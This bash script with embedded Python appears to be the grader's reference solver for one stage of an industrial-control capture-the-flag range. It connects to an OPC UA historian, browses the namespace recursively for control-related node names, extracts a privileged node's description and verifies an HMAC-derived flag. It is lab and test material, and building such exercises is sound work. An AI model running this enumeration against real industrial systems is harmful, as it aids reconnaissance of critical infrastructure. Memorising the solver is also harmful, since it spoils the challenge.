#!/usr/bin/env bash
###############################################################################
# Reference validation script — author/grader use only.
# Requires knowledge of this instance's seed context; has no function against
# production infrastructure.
#
# Connects via asyncua from the pivoted position, recursively browses the
# full namespace, filters by control-oriented substrings used server-side,
# locates the privileged node, reads its Description, recomputes
# derive_flag(seed, 3, artifact), and prints for grading.
#
# Usage:
#   ./red_attack_script.sh [--validation-mode]
#
# Requires: python3, asyncua (pip install asyncua), openssl, bash
###############################################################################
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SHARED_DIR="$(cd "${SCRIPT_DIR}/../shared" && pwd)"
RANGE_ENV="${SHARED_DIR}/range.env"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
info()  { echo -e "${GREEN}[+]${NC} $*"; }
warn()  { echo -e "${YELLOW}[!]${NC} $*"; }
err()   { echo -e "${RED}[-]${NC} $*" >&2; }
die()   { err "$@"; exit 1; }

# Load range config
[[ -f "$RANGE_ENV" ]] || die "range.env not found at ${RANGE_ENV}"
# shellcheck disable=SC1090
source "$RANGE_ENV"

# Validate required vars
[[ -n "${INSTANCE_SEED:-}" ]] || die "INSTANCE_SEED not set in range.env"
[[ -n "${HISTORIAN_IP:-}" ]] || die "HISTORIAN_IP not set"
[[ -n "${ASDU_ADDR_DESC:-}" ]] || die "ASDU_ADDR_DESC not set"

# Export for solve.py subprocess (source sets shell vars, not env vars)
export INSTANCE_SEED HISTORIAN_IP ASDU_ADDR_DESC

info "=== Stage 3 Validation — Historian Namespace Extraction ==="
echo ""

# --- Step 1: Check OPC UA connectivity ------------------------------------
info "Step 1: Checking OPC UA port 4840 connectivity on ${HISTORIAN_IP}..."
if ! timeout 5 bash -c "echo >/dev/tcp/${HISTORIAN_IP}/4840" 2>/dev/null; then
    die "OPC UA port 4840 not reachable on ${HISTORIAN_IP}"
fi
info "OPC UA port reachable"

# --- Step 2: Run the solve script ------------------------------------------
info "Step 2: Running recursive namespace browser..."

SOLVE_OUTPUT=$(python3 - 2>&1 << 'EOF'
import asyncio
import os
import sys
import hmac
import hashlib

from asyncua import Client, ua

HISTORIAN_IP = os.environ.get("HISTORIAN_IP", os.environ.get("SOLVE_TARGET_IP", "127.0.0.1"))
ENDPOINT = f"opc.tcp://{HISTORIAN_IP}:4840/prabalurja/historian"
INSTANCE_SEED = os.environ.get("INSTANCE_SEED", "")
if not INSTANCE_SEED and os.path.exists("/run/secrets/ctf_seed"):
    try:
        with open("/run/secrets/ctf_seed", "r") as f:
            INSTANCE_SEED = f.read().strip()
    except Exception:
        pass

_CTRL_KEYWORDS = [
    "RemoteAddr", "ProtocolCfg", "CommLink", "AsduConfig",
    "TelecontrolRef", "StationParam", "LinkAddr", "FieldUnit",
    "RemoteTerminal", "CtrlEndpoint", "DeviceRegistry", "RemoteUnit",
    "ctlSelOn", "stVal", "stNum", "ctlVal",
]

async def recursive_browse(node, depth=0, max_depth=10):
    try:
        children = await node.get_children()
    except Exception:
        return

    for child in children:
        try:
            browse_name = await child.read_browse_name()
            name_str = browse_name.Name if browse_name else ""
        except Exception:
            name_str = ""

        yield child, name_str, depth

        if depth < max_depth:
            async for item in recursive_browse(child, depth + 1, max_depth):
                yield item

async def solve():
    print(f"[*] Connecting to {ENDPOINT}", file=sys.stderr)
    client = Client(url=ENDPOINT)
    await client.connect()
    try:
        root = client.get_objects_node()
        print(f"[*] Browsing namespace recursively...", file=sys.stderr)
        candidates = []
        async for node, name, depth in recursive_browse(root, depth=0):
            is_control = any(kw in name for kw in _CTRL_KEYWORDS)
            if is_control:
                try:
                    desc_val = await node.read_description()
                    desc_text = ""
                    if desc_val is not None:
                        if hasattr(desc_val, 'Text'):
                            desc_text = desc_val.Text or ""
                        else:
                            desc_text = str(desc_val)
                    if desc_text:
                        print(f"[*] Control node: {name} (depth={depth}) desc={desc_text!r}", file=sys.stderr)
                        candidates.append((node, name, depth, desc_text))
                except Exception as e:
                    print(f"[!] Error reading description for {name}: {e}", file=sys.stderr)

        privileged = None
        for node, name, depth, desc in candidates:
            desc_stripped = desc.strip()
            if desc_stripped.isdigit() and len(desc_stripped) <= 6:
                privileged = (node, name, depth, desc_stripped)
                break

        if privileged is None:
            non_telem = [c for c in candidates
                         if not c[3].startswith("Telemetry point:")
                         and not c[3].startswith("Deep record:")]
            if non_telem:
                privileged = min(non_telem, key=lambda x: len(x[3]))

        if privileged:
            _, pname, pdepth, pdesc = privileged
            print(f"[+] Privileged node found: {pname} at depth {pdepth}", file=sys.stderr)
            print(f"[+] Description: {pdesc}", file=sys.stderr)
            print(f"ARTIFACT:{pdesc}")
            if INSTANCE_SEED:
                flag_msg = f"STAGE3:{pdesc}"
                flag_hex = hmac.new(
                    bytes.fromhex(INSTANCE_SEED),
                    flag_msg.encode(),
                    hashlib.sha256
                ).hexdigest()[:16]
                flag = f"FLAG{{S3-{flag_hex}}}"
                print(f"[+] Computed flag: {flag}", file=sys.stderr)
        else:
            print("[!] No privileged node found in namespace", file=sys.stderr)
            sys.exit(1)
    finally:
        await client.disconnect()

if __name__ == "__main__":
    asyncio.run(solve())
EOF
) || {
    err "Solver execution failed:"
    echo "$SOLVE_OUTPUT"
    exit 1
}

# Extract the description value found by the solver
EXTRACTED_DESC=$(echo "$SOLVE_OUTPUT" | grep "^ARTIFACT:" | sed 's/^ARTIFACT://')

if [[ -z "$EXTRACTED_DESC" ]]; then
    die "Solver did not return an ARTIFACT line"
fi

info "Artifact extracted via recursive browse:"
echo "  Description = ${EXTRACTED_DESC}"
echo ""

# --- Step 3: Independently compute the flag --------------------------------
info "Step 3: Computing flag from seed + artifact..."

FLAG_MSG="STAGE3:${EXTRACTED_DESC}"
FLAG_HEX=$(echo -n "$FLAG_MSG" | \
    openssl dgst -sha256 -mac HMAC -macopt "hexkey:${INSTANCE_SEED}" | \
    awk '{print $NF}' | head -c 16)
COMPUTED_FLAG="FLAG{S3-${FLAG_HEX}}"

info "Computed flag: ${COMPUTED_FLAG}"

# --- Step 4: Diff against stored flag --------------------------------------
info "Step 4: Verifying against stored flag..."

STORED_FLAG=$(sudo -E podman exec historian-srv cat /run/ctf/stage3_flag 2>/dev/null) || \
    warn "Could not read stored flag from container"

if [[ -n "${STORED_FLAG:-}" ]]; then
    if [[ "$COMPUTED_FLAG" == "$STORED_FLAG" ]]; then
        echo ""
        info "✅ FLAG MATCH — Validation PASSED"
        echo -e "  Computed: ${GREEN}${COMPUTED_FLAG}${NC}"
        echo -e "  Stored:   ${GREEN}${STORED_FLAG}${NC}"
    else
        echo ""
        err "❌ FLAG MISMATCH — Validation FAILED"
        echo -e "  Computed: ${RED}${COMPUTED_FLAG}${NC}"
        echo -e "  Stored:   ${RED}${STORED_FLAG}${NC}"
        exit 1
    fi
else
    warn "Could not verify against stored flag — manual check required"
    echo -e "  Computed flag: ${YELLOW}${COMPUTED_FLAG}${NC}"
fi

echo ""
info "=== Validation complete ==="
